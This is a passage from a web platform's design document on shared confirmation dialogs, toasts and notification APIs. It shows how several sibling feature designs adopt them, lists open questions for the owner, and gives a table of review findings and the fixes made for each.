| status-pages `OYS.dialog.confirm({title, text, confirm, danger})`, `OYS.dialog.prompt`, `OYS.toast(text, kind)` (`status-pages.md` §9) | `OYSUI.confirm({title, text, ok, tone: 'danger'})`, `OYSUI.prompt`, `OYSUI.toast(text, tone)` |
| discord-pages `data-confirm` with a danger variant, admin toasts for bot results | `data-confirm-tone="danger"` + `confirmField()`, `OYSUI.toast` |

**Per design:**
- **honeycomb-shop:**
  - its `Notice` becomes §5.2's: `kind` → `tone` (`earn`/`spend`/`gift`/`refund`/`correction` → `hc`, `info` →
    `info`, `warn` → `warn`), `action {label, tab, feature}` → `{label, link: '/dashboard#honeycombs/<feature>'}`;
  - `shop-buy` and `hc-redeem` answer `notices: [Notice]` instead of a singular `notice`; `honeycombs` and the
    bootstrap carry a top-level `notices` (bootstrap: `OYS_EDITOR.notices`, earned rewards included) instead of
    `honeycombs.notices`;
  - the shop never renders notices itself (§5.4);
  - bell types `honeycombs` and `unlock` (catalogue rows ship in 5a);
  - the `--hc*` tokens come from `ui.css`; `editor.css` uses them (with `var(--hc, #facc15)` fallbacks only if a
    rule must also work in the PHP rollback); `.toast.hc` needs no recolour;
  - purchase dialog via `content` + `canConfirm` + `onConfirm`/`ctl.update` (§6.2 notes); negative grants via
    `beforeSubmit`; all money-moving admin forms with `confirmAttrs()`/`confirmField()`;
  - its integrity alerts via `notifyAdmins('team', …, '/admin#honeycombs')` – visible in the admin header bell;
  - its Q6 (reminder emails) is merged with Q4 here – one question for the owner;
  - if the owner wants retention (Q5): the shared nightly registry in its tick (§5.7).
- **code-slots-admin:** keeps `confirmAttrs()` + `confirmField()` on the moved admin forms (§7.2); the typed admin
  *Delete* as above; slot conversions use `OYSUI.confirm/prompt`; the "Download files" button of its delete dialog goes
  into `content`, not `text` (§6.2); `openModal()` stays the container for its multi-field dialogs (registered as a
  layer, §7.1 row 12). `notifyOwner()` calls `notify(uid, 'code', …)` **without `{ref}`**: `ref = 'cm' +
  moderationLogId` is unique per log row, so it could not catch a retried request anyway (a retry writes a new log
  row); notifying once after the log row's commit is the whole guarantee. Its bell links `/dashboard?site=ID#code`
  navigate through the guard (§6.10). It also moves the account-level editor actions before the page check (its
  §4.4); whichever of its PR and 5a merges first does the move for `messages`, `message`, `booking-delete`,
  `notifications`, `notifications-read`, the other drops it.
- **premium-domains:** type-to-confirm with `normalize: 'host'` (stored hostnames are ASCII/punycode,
  `premium-domains.md` §3.1), shown in Unicode via `matchLabel`; apex question as a 3-option `choice`; admin *Disable*
  with `confirmAttrs()`; `domains/notify.ts` calls `notify()` with types `domain_live|domain_back|domain_problem|
  domain_paused|domain_removed` (rows in 5a); a `DEEP_LINKS` arg for its section (`/dashboard#settings/domain`).
- **status-pages:** public status page = page skin, loads `ui.js` (its subscribe form then gets themed field errors);
  `status-manage.js` = app skin, calls `OYSUI.handle()` in its own fetch wrapper and may register its dirty state with
  `OYSUI.guard()`; bell type `status` (`bx-pulse`, row in 5a) through `notify()` instead of `oys_notify`; admin alerts
  through `notifyAdmins('status', …, '/admin#status')` – shown in the admin header bell (§6.10); a `DEEP_LINKS` entry
  `status`.
- **discord-pages:** the confirmations it lists (delete update, remove webhook, delete token, forget post, delete
  milestone, turning the suggestions page on) use `confirmAttrs()` + `confirmField()`; bot results via `OYSUI.toast`
  on the admin page; `notifyAdmins()` for a dead update post. Its `publicPages` migration (`discord-pages.md` §4.2)
  writes two notices with `INSERT … SELECT` inside its transaction; instead it selects the affected user ids and calls
  `notify(uid, 'system', …, {db: conn})` per row in the same transaction (a handful of rows), so text cutting and
  `safeLink` apply – PR 5a should merge first.
- **All:** no `alert/confirm/prompt`, no inline `onsubmit`, no raw notification INSERTs (lint); forms need no
  validation attributes (§6.7); register catalogue rows and `DEEP_LINKS` targets in their own PRs; take the next free
  schema version at merge time; features that make the PHP rollback unusable add their own `--rollback` guard
  (`plan.md` §5.6).

### 11.4 What the others get

`ui.d.ts` (PR 0) and `OYSUI` (PR 1) as a stable, additive API; `confirmAttrs()`/`confirmField()` with server-side
fail-closed checking; the global form check; the leave guard with `navigate()`; `notify()` / `notifyAdmins()` (PR 5a,
no dependencies); the `notices` convention; deep links and an admin bell (PR 5b).

---

## 12. Open questions for the owner

1. **Users' own live code pages:** may their scripts keep using the browser's pop-ups (`alert` …) on their own
   address? *Recommended: yes.* It is their website, opened in its own tab with its own address bar
   (`mia.on-your.site`), never inside the editor – the editor preview blocks these pop-ups from now on (§8). Browsers do
   not reliably name the code page in the dialog itself (for sandboxed pages Chromium shows a generic title), but a
   user could put a fake login form on that page anyway, so blocking `alert()` there adds no real protection; abuse
   is handled by the code page terms and the report link. Our starter example uses an in-page message. If the answer
   is no, `allow-modals` is also removed from the code page CSP (`lib/codesites.php:16`).
2. **Deleting a block:** ask first with our dialog (like today), or delete at once with an "Undo" button in the notice?
   *Recommended: ask first* now; "Undo" can follow later.
3. **Leaving with unsaved changes:** only "Stay / Leave without saving" (like today), or also "Save and leave"?
   *Recommended: the two buttons first*; "Save and leave" later if wanted.
4. **Emails for new events** (one question for honeycomb-shop's Q6, premium-domains' emails and this design): which
   new notifications also send an email? *Recommended:* only where the user must act or loses something – Premium or
   an unlock ending (one email 3 days before and one when it ended, can be turned off in the editor –
   honeycomb-shop's proposal), custom domain live / problem / paused / removed (at most once per domain per 24 h –
   premium-domains' proposal), status alerts (per the status module's settings). Gifts, rewards, purchases and code
   page moderation: bell only. Today's emails (messages, bookings, weekly report) stay.
5. **History in the bell:** should old notifications be deleted at all? *Recommended: yes, but only read ones* –
   read notifications after 90 days, everything after one year, at most 200 read ones per account; switched on by an
   admin setting. Until you decide, nothing is deleted.
6. **The browser's own "Leave site?" dialog:** now that unsaved changes are kept in the browser and offered again,
   may it be dropped? *Recommended: yes* – show it only when the browser could not store the local copy (storage
   blocked or full), so in normal use no browser pop-up remains.

---

## 13. Review changes

Changes made after the review (finding numbers as in the review). All code references were re-checked against the
repository and the five other designs; `premium-domains.md` and `status-pages.md` now exist and were read.
`code-slots-admin.md` and `discord-pages.md` were revised while this revision was written; §11.3 follows their revised
versions (OYSUI names already adopted, a visible typed field for the admin *Delete*, `{ref}` still passed by
code-slots-admin, an `INSERT … SELECT` notice migration in discord-pages). References into other designs use section
numbers, because their line numbers keep moving.

| # | Finding | Verdict | What changed |
|---|---|---|---|
| 1 | Frozen API cannot build the dialogs others need | accepted | §6.2 is now the typed contract `static/js/ui.d.ts`, published as PR 0 with sign-off from honeycomb-shop and code-slots-admin: `content` (node or builder), `Ctl` with `values()`, `update()`, `message()/error()`, `close()`; `canConfirm`; `onConfirm(value, ctl)`; `match` + `normalize` (incl. `host` for punycode) + `matchLabel`; `data-confirm-match/-label/-normalize/-into`; `OYSUI.beforeSubmit()`. Name mapping for all five designs in §11.3; unknown option keys warn |
| 2 | Notice, toast, type and colour contracts conflict with honeycomb-shop | accepted, one part adjusted | One `Notice {tone, text, title?, amount?, action?{label, link}}`, always top-level `notices[]`, shown only by `OYSUI.handle()`/start code (§5.4); `toast()` object form with title/amount/action and a queue that drops nothing (§6.6); `unlock` (and `honeycombs`) rows; `--oys-honey` dropped; `--hc*` tokens defined once in `ui.css`; this feature owns `.ui-toast.*`; `.toast.hc` is no longer deleted by PR 2 (finding 3), so no PR conflict; Q4 merged with honeycomb-shop Q6. *Adjusted:* the tokens are not repeated in `page.css` – public pages have no honeycomb UI, and `ui.css` is loaded on every app page including admin, so one definition covers every user of the tokens (§6.5) |
| 3 | Shared static files break the PHP rollback | accepted | Rule R (§11.2): legacy adapter in `editor.js` until 3.1, `.toast*` CSS and `OYS_FLASH` kept (the `#oys-flash` JSON channel is dropped altogether), `page.js` fallbacks, `bell.js` self-loading; PHP rollback smoke test (§9). No `--rollback` refusal needed for this feature (index only); the general guard is noted for `plan.md` §5.6 |
| 4 | Destructive admin actions run without asking when ui.js fails | accepted (server variant) | Server-checked `_confirmed` field (§5.6, §6.8): an unconfirmed form changes nothing; e2e flow 7 blocks `ui.js`. Chosen over `type="button"` because a form without a submit button and with exactly one text field still submits on Enter (implicit submission) – e.g. the code page block form with its reason input (`views/admin_honeycombs.php:123-126`) – and `form.submit()` from other scripts skips any client check; the server check covers both, and its refusal is visible as a banner (banners work without `ui.js`, §5.5) |
| 5 | Promise dialogs create stale-state races | accepted | Re-check rule with lookup by id and an `idmap` rename map, new "After the dialog" column for every call site (§7.1); e2e flow 2 delays `/dashboard/api/save` |
| 6 | Leave guard misses navigations | accepted, one part adjusted | `guard.navigate/reload({force})` + `OYSUI.navigate()`, lint against bare `location.*` in guarded scripts; page creation (`editor.js:711`), the page-delete redirect and the session-dialog buttons in §7.1 (rows 8, 9, 15); non-http(s) schemes excluded with a 1.5-s bypass; bypass one-shot, expiring after 1.5 s and on `focus`/`pageshow`; Back closes the top layer via `CloseWatcher`. *Adjusted:* links to **other origins** in the same tab are still intercepted (they unload the editor too); `pushState` was rejected because it races with `history.replaceState` in `switchTab` (`editor.js:1016`); Back out of the page cannot be intercepted cross-document (drafts cover it) |
| 7 | Validation bubbles need per-form opt-in | accepted | One capture `invalid` handler for every form (§6.7); `data-validate` and the `novalidate` opt-in removed; hidden invalid fields get a toast. Note: the cited discord-pages webhook field is actually `type="text" inputmode="url"` (`discord-pages.md` §6.1), but status-pages' subscribe form, honeycomb-shop's admin numbers/dates and premium-domains' domain input prove the point |
| 8 | Preview iframes keep `allow-modals` (phishing admins) | accepted | `allow-modals` removed from both previews + hint (§7.1 row 20); exploit and fix in §8; §2.4 and Q1 rationale corrected (no claim that the browser shows the address); dialog titles become a manual release check (§9) – they could not be verified in this environment |
| 9 | Admin alerts land in a bell admins do not see | accepted | Bell in the admin header with `team`/`status` items linking to admin tabs (§6.10, PR 5b) |
| 10 | Session expiry throws away work; last browser pop-up not put to the owner | accepted | 401/419 dialogs with *Close* + sticky "Log in" toast (§3.1, §7.1 row 15); local drafts with "Restore unsaved changes?" (§6.11); new owner question Q6 on dropping `beforeunload` |
| 11 | Scope creep and data-loss risk in storage | accepted | `ref` and its unique key removed; migration is one index (§4.1); retention off, only after Q5, behind a setting, on a shared job runner, cap only on read rows (§5.7, optional PR 6); no own timer (§10). code-slots-admin's revised design still passes `{ref}`; §11.3 shows why its log-id ref adds nothing |
| 12 | `notify()` arrives too late; others bypass it | accepted | PR 5 split into 5a (core + API, no dependency) and 5b (bell UI); `opts.db` for migrations/transactions; lint against `INSERT INTO notifications` outside `app/src/notify/` (§7.5, §11.1) |
| 13 | "Mark all as read" marks unseen items | accepted | `{upTo: latest}` + `AND id <= ?` (§5.3); `{}` kept only for tabs opened before the deploy |
| 14 | Toast clicks act under an open or busy dialog | accepted | Toast clicks only dismiss while a layer is open; links/actions are held until the stack is empty (§6.3) |
| 15 | Confirmed forms can be submitted twice; newsletter text | accepted | Buttons disabled + `aria-busy` until `pageshow` (§6.8); newsletter text via `beforeSubmit` naming the single address (§7.2); `data-confirm-fill` removed |
| 16 | Lint rule and CSP claim wrong | accepted | New regex (extended to `self.`/`top.`/`parent.`); CSP claim dropped; remaining inline handlers listed and left out of scope (§6.8) |
| 17 | Themed skin misses base rules | accepted | `ui.js` injects the skin-neutral base stylesheet; `max-height: min(86vh, 86dvh)` in both skins, also on the existing `.oys-modal-box` (§6.4, §6.5) |
| 18 | Client link check weaker than `safeLink` | accepted | Same regex **and** same-origin `URL` check in `openLink` (§6.10) |
| 19 | Bell links break without a shown link page | accepted | `messages`, `message`, `booking-delete` before the page check (§5.3); the messages tab loads without a page (§7.1 row 21) |
| 20 | Some requests bypass `api()` | accepted | One `request()` for API, uploads and preview (§7.1 row 14) |
| 21 | Accessibility and mobile details | accepted | `alertdialog` only for alert/confirm; IME guard; toast actions held and always reachable elsewhere; `layer()` requires a `<body>` child; 6th layer = Cancel (§6.3) |
| 22 | Test plan gaps | accepted | Minimum raised to Safari/iOS 15.5 (native `inert`, `submitter`); the `requestSubmit` and gutter fallbacks are forced in component tests; `CloseWatcher` stubbed; the global native-dialog handler allows an intended `beforeunload` and dismisses first; new e2e flows for page creation with unsaved code, `mailto:` while dirty, draft restore after expiry, the save race, blocked `ui.js` and the preview (§9) |
| 23 | Contracts with two features could not be checked | accepted, done | Both designs read: premium-domains uses five `domain_*` types (rows added), a punycode type-to-confirm (`normalize: 'host'`) and a 3-button apex choice; status-pages uses one type `status`, the page skin for public pages and the app skin for `status-manage.js`, and admin alerts in the admins' bell (§5.2, §6.5, §11.3) |

Rejected findings: none outright. Deviations from a proposed fix, with reasons, are marked "adjusted" above (2: tokens
not duplicated in `page.css`; 4: server check instead of `type="button"`; 6: cross-origin links still guarded,
`CloseWatcher` instead of `pushState`). Other removals that follow from the fixes: the `#oys-flash` JSON channel and
`flashScript()` (editor keeps `OYS_FLASH`, admin keeps progressive banners), `data-validate`, `data-confirm-fill`, the
`ref` de-duplication, the notification timer unit and the old Safari 15.0–15.4 focus-guard and submitter fallbacks.
